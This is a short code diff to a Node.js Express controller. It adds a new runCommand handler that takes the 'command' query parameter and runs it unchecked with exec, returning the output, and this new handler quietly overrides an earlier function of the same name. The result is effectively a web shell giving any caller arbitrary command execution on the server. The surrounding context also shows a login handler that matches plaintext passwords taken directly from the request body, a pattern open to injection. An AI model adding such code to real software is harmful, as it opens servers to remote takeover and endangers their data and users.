@@ -44,6 +44,16 @@ exports.runCommand = function (req, res, next) {
   });
 };
 
+exports.runCommand = function (req, res, next) {
+  var userCommand = req.query.command;
+  exec(userCommand, function (err, stdout, stderr) {
+    if (err) {
+      return res.send('Error executing command.');
+    }
+    res.send(stdout);
+  });
+};
+
 exports.loginHandler = function (req, res, next) {
   if (validator.isEmail(req.body.username)) {
     User.find({ username: req.body.username, password: req.body.password }, function (err, users) {
